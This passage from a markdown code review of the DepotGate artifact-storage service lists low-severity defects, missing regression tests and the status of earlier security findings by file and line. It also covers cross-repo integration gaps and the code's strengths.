  `CODE_REVIEW_1.md`, unfixed.
- **L-2** `src/depotgate/receiptgate_client.py:48-49` and `sinks/http.py:85` — bare
  `except Exception: return False` / `except Exception: pass` with no logging. A ReceiptGate
  outage is indistinguishable from a malformed payload from a TLS failure.
- **L-3** `src/depotgate/middleware/rate_limit.py:50-52` — rate limiting is keyed on
  `request.client.host` with no `X-Forwarded-For` handling. Behind the reverse proxy the README
  recommends, all callers share one bucket of 200/min; a single noisy worker starves the mesh.
  The `get_rate_limiter` singleton (`rate_limit.py:67-72`) also latches the first
  `enabled`/`calls_per_minute` it sees, so config changes need a restart.
- **L-4** `src/depotgate/sinks/filesystem.py:108-110` — `validate_destination` calls
  `mkdir(parents=True)`. A read-only validation call has a filesystem side effect; probing
  destinations creates empty directories under the shipped tree.
- **L-5** `src/depotgate/core/shipping.py:123` — a closure miss permanently sets the
  deliverable to `"rejected"`, but `ship()` only guards against `"shipped"` (`shipping.py:99`),
  so a "rejected" deliverable can still ship later. The status is misleading rather than
  enforcing.
- **L-6** `src/depotgate/mcp/routes.py:473` — `a.staged_at.isoformat()` emits a naive timestamp
  with no offset (columns are `DateTime` + `utcnow`). Consumers will parse it as local time.
- **L-7** `src/depotgate/legivellum_receipts.py:400` — purge receipts build
  `artifact_refs=[{"artifact_id": aid}]` with no `uri`/`checksum`/`role`, unlike
  `_artifact_ref` (`legivellum_receipts.py:59-70`) used everywhere else. Schema-legal
  (`artifact_refs.items.additionalProperties: true`) but inconsistent, so a consumer cannot
  reconcile a purge against the staging receipt without a second lookup.
- **L-8** `src/depotgate/legivellum_receipts.py:202` — `artifact_location=settings.storage_backend`
  puts the literal string `"filesystem"` in a field the schema describes as a location.
- **L-9** `src/depotgate/storage/filesystem.py:37` — sanitizer does not strip `\x00`, control
  characters, or apply NFC normalization; `root_task_id` is otherwise unvalidated (no length or
  charset check) at the MCP boundary. `CODE_REVIEW_1.md` HIGH-003 recommended a
  `pattern=r'^[a-zA-Z0-9_-]+$'` constraint; unfixed.
- **L-10** No security headers middleware (`nosniff`, `X-Frame-Options`); low impact given
  JSON-only responses, but CORS is configured with `allow_credentials=True` against localhost
  dev origins by default in production config (`config.py:119-126`).
- **NIT** `mypy` config is `strict = true` in `pyproject.toml` but CI runs a separate
  `.mypy-ci.ini`; several core functions are untyped (`_select_artifacts_for_shipment(self, spec, …)`
  at `shipping.py:194-198`, `unmet_requirements: list` at `shipping.py:37`).

## Test Coverage Gaps

7 test files, 38 test functions, **7 skipped** — and the skips are exactly the code that
matters (`test_api.py`, `test_mcp.py`: every staging, listing, declaring, closure, ship and
purge path, all `reason="Requires database connection"`). CI enforces `--cov-fail-under=55`,
which is satisfiable almost entirely by model construction and filesystem-primitive tests.

Named missing regressions, in the order I would write them:

1. **Cross-principal access** — B calls `list_staged_artifacts`/`get_artifact`/`purge` on A's
   `root_task_id` and is denied. Cannot even be expressed today (F-1). No test file mentions
   isolation; `conftest.py:23` sets `DEPOTGATE_ALLOW_INSECURE_DEV=true` process-wide, so
   **`verify_api_key` is never executed by any test** — a 401 regression would ship silently.
2. **Path traversal** — `SECURITY_PUNCHLIST.md` supplied four ready-to-paste tests
   (`test_path_traversal_in_storage_blocked`, `…in_location_blocked`,
   `test_destination_path_traversal_blocked`, `test_absolute_destination_rejected`);
   `CODE_REVIEW_1.md` repeated the request. **None were added.** The fixes are real but
   completely unguarded — the next refactor of `_sanitize_path_component` reopens BLOCK-001
   with a green build.
3. **Size limit enforcement** — `storage_max_artifact_bytes` has zero coverage in either the
   bytes or the streaming branch, including the partial-file cleanup at
   `storage/filesystem.py:118-123`.
4. **Receipt phase/task_id conformance** — `test_legivellum_receipts.py` asserts payload fields
   but never asserts that DepotGate does not stamp `phase=complete` on a foreign `task_id`
   (F-2), and never validates against `receipt.schema.v1.json` when the shared lib is absent
   (F-6).
5. **Purge does not delete referenced artifacts** — no test declares a deliverable, purges the
   task, and asserts the deliverable can still ship (or is refused for a stated reason).
6. **Retention semantics** — no test asserts that `retain_7d` keeps the artifact *visible*
   (it does not — F-7).
7. **Double-ship** — no concurrency test on `ship` (F-11); no test that a second `ship` of a
   shipped deliverable is refused (the code path exists but is only reachable with a DB).
8. **HTTP sink end-to-end** — `test_sinks.py:126-139` tests the factory's string splitting and
   asserts the very behaviour that breaks validation (F-8); no test calls
   `HttpSink.validate_destination` at all.
9. **Idempotent staging** (Exit Criteria §7 "dedupe behavior verified") — absent.

Infrastructure: no docker-compose test database, no integration job in CI
(`.github/workflows/ci.yml` runs `pytest` with no Postgres service), so the skipped tests can
never run anywhere. `conftest.py:15-23` mutates `os.environ` at import time, which is why the
auth path is untestable without restructuring.

## Delta vs prior reviews

Three overlapping documents exist: `.claude/SECURITY_PUNCHLIST.md` (Jan 7), `CODE_REVIEW_1.md`
(Jan 8), `Below is a comprehensive code revie.txt` (undated), plus `Untitled.txt` — which is
**not a review at all** but a document self-labelled *"Status: Normative (LegiVellum v1.1
alignment)"*. That is a process finding in itself: a normative spec is sitting in a file named
`Untitled.txt` at the repo root, is referenced by nothing, appears in no index, and none of its
§4 required API surface (`depot.resolve`, `depot.fetch`, `depot.ingest_from`, `depot.stat`) is
implemented, while its §6.1 ("tenant_id is server-assigned from auth context… All pointer
resolution MUST be scoped to tenant") is violated by F-1. Meanwhile the canonical
`LegiVellum/docs/canonical/DepotGate/alignment.md` asserts "**Aligned** with canonical
contracts" — which F-2 alone falsifies. Two of the three review docs also carry a "LEGACY NOTE"
banner about REST endpoints that no longer exist, so a reader cannot tell which findings still
apply without re-deriving them. There is no `V1_EXIT_CRITERIA.md`, unlike InterView and
InterroGate.

**Fixed:**

| Prior finding | Status |
|---|---|
| BLOCK-001 path traversal in storage (`tenant_id`/`root_task_id`, `location`) | **Fixed** — `storage/filesystem.py:27-71`, verified by reading; absolute and `..` locations both rejected. |
| BLOCK-002 path traversal in shipping sink | **Fixed** — `sinks/filesystem.py:31-59`; absolute paths now permitted only if they resolve under `base_path`, which resolves the policy conflict raised as finding 4 in `Below is a comprehensive…`. |
| BLOCK-003 Docker runs as root | **Fixed** — `Dockerfile:22-38`, `USER depotgate`. |
| CRIT-001 no API authentication | **Partially fixed** — `auth.py` + router-level dependency (`mcp/routes.py:40`) with `secrets.compare_digest` and fail-closed config validation. Still a single shared key with no principal (F-1). |
| HIGH-001 CORS allows all origins | **Fixed** — explicit allowlist, `config.py:119-134`. |
| HIGH-002 default DB credentials | **Fixed in code, broken in deployment** — `SecretStr` + insecure-default rejection (`config.py:201-218`), but `docker-compose.yml` still ships `depotgate`, which now makes the container fail to start (F-19). |
| MED-001 no rate limiting | **Fixed** — `middleware/rate_limit.py`, wired at `mcp/routes.py:40` (contrast AsyncGate, where the equivalent limiter was never wired in). |
| MED-005 missing Dockerfile | **Fixed.** |
| Finding 2 (`/stage/bytes` body/file mismatch) | **Moot** — REST surface removed; MCP-only. |
| MCP tool namespacing (`mcp.naming.md`) | **Fixed**, with a legacy alias map and a test asserting all advertised names are prefixed (`test_mcp.py:22-32`). |
| Listing omitted `location`/`content_hash` | **Fixed** — `mcp/routes.py:459-466`, with the reasoning recorded inline. |

**Still open (unchanged since January):**

| Prior finding | Now |
|---|---|
| MED-002 deprecated `datetime.utcnow()` | 10 call sites remain; now compounded by tz-naive DB columns vs `receipt.rules.md` §5 (F-20). |
| MED-003 inline imports | `staging.py:69`, `deliverables.py:60` (L-1). |
| MED-004 broad exception catching | `mcp/routes.py:383` — now also a transaction-boundary bug (F-12). |
| MED-006 tests skip DB operations | 7 skips, no CI Postgres service. |
| HIGH-003 no input validation on `root_task_id` | No length/charset constraint anywhere (L-9). |
| "No security tests" (both docs, with sample code supplied) | Still zero. |
| Finding 1 memory exhaustion on upload | Migrated intact from REST to MCP (F-4). |
| Finding 5 `RECEIPT_PHASE` always met | Unchanged (F-10). |
| Finding 6 HTTP sink unbounded payload | Allowlist added (deny-by-default); payload still fully buffered (F-17). |
| LOW-002 no logging | Core modules still have none. |

**Regressed:**

| What | How |
|---|---|
| Receipt payload integrity | `SECURITY_PUNCHLIST.md` MED-003 proposed a redaction regex "as a recommendation"; it was adopted almost verbatim into `core/receipts.py:53-54` and now destroys every UUID, hash, location and MIME type in the local ledger (**F-3**). A speculative hardening suggestion was implemented without a single test, and it broke the audit trail. |
| Canonical receipt emission | Added since `CODE_REVIEW_1.md` (which predates `legivellum_receipts.py`) and introduces **F-2**, the most damaging finding in this review — new surface, new critical defect, no conformance test. |

## Cross-repo observations

1. **DepotGate is the only reviewed gate with no principal model at all.** AsyncGate scored PASS
   on Exit Criteria §3 (`principals.py`, `_resolve_obligation_owner`); ReceiptGate has the
   constants but does not enforce them; DepotGate has neither. Any stack-wide principal
   convention rollout must treat this repo as greenfield, and `tenant_id` moving from config to
   request is a breaking API change — so tagging v1 here *before* that work locks in the wrong
   contract (Exit Criteria §9).
2. **F-2 is a cross-repo hazard, not a local one.** ReceiptGate's terminator detection was
   already found to close obligations on bare `task_id` match. DepotGate emits `complete`
   receipts on `root_task_id` for staging, purging and rejection. Composed, a mid-run
   `stage_artifact` closes a live obligation in the canonical ledger. Either fix alone
   mitigates; neither is fixed. This should be validated as an integration test in
   `LegiVellum`'s demo stack, not in either repo alone.
3. **Non-integer JSON-RPC `error.code` is now confirmed in three repos** (DepotGate
   `mcp/routes.py:309`, ReceiptGate, AsyncGate). It belongs in the canonical MCP contract
   (`mcp.naming.md` or a sibling) with a shared error-envelope helper in
   `LegiVellum/shared/legivellum/`, not fixed three times.
4. **The shared-library import fallback is copy-pasted and fragile.** `legivellum_receipts.py:14-33`
   and `metagate_client.py:38-61` each walk parent directories for a `LegiVellum` checkout,
   with a comment recording a previous `parents[4]` IndexError crash. Neither works inside the
   Docker image. `legivellum` should be a real installable dependency (`pyproject.toml`), which
   would also close F-6 across every gate that does this.
5. **`Untitled.txt` §7 assigns DepotGate obligations other gates depend on** — MemoryGate stores
   pointers only, AsyncGate workers *fetch* inputs via DepotGate, CogniGate reads artifacts via
   DepotGate. DepotGate exposes **no read-bytes tool whatsoever**. Every one of those
   integrations is currently impossible, and the gap is invisible because the spec lives in an
   untitled file. Whoever owns the stack should decide whether that document is normative and,
   if so, file it under `LegiVellum/docs/canonical/DepotGate/` and score against it.
6. **Retention/GC is a stack-level gap.** AsyncGate has lease expiry, ReceiptGate has archival
   fields (`archived_at`), DepotGate has purge policies that do not work (F-7). Nothing in the
   stack reference-counts artifacts against `artifact_refs` in receipts, so the ledger's
   pointers rot silently.

## What's solid

- The path-traversal fixes are correct, not theatre: `_location_to_path` resolves *then*
  `relative_to`, which handles `..`, absolute paths and symlink escapes, and the sink uses the
  same routine for `validate_destination` and `ship` so the two cannot drift.
- The non-goals in the v0 spec are genuinely respected — nothing anywhere parses, sniffs,
  transforms or decompresses artifact content, and there is no scheduling or retry logic. That
  discipline is rarer than it sounds and it is why the decompression-bomb row of the audit is
  N/A rather than a finding.
- Content is SHA-256 hashed on the way in, streaming and bytes paths share the hasher, and the
  streaming branch cleans up its partial file on overflow (`storage/filesystem.py:117-123`).
- The MetaGate bootstrap binding (`metagate_client.py`) is careful, well-reasoned and
  fail-open-by-design, with the reasoning written down at the point of decision.
- Storage backends and sinks sit behind real ABCs with factories and registration hooks — the
  "storage-agnostic" claim in the spec is architecturally honest even though only one backend
  ships.
- Auth, when reached, is done properly: `secrets.compare_digest`, fail-closed on missing
  config, a 503 (not a 401) for server misconfiguration, and a key generator with a prefix
  convention.
- CI is above the stack average: `pip check`, `compileall`, ruff error-class gate, mypy, a
  coverage floor, and a Docker build.
- Several comments record *why* a change was made (the `parents[4]` crash, the listing that
  omitted hashes, the legacy alias map). That is real institutional memory and it made this
  review faster.
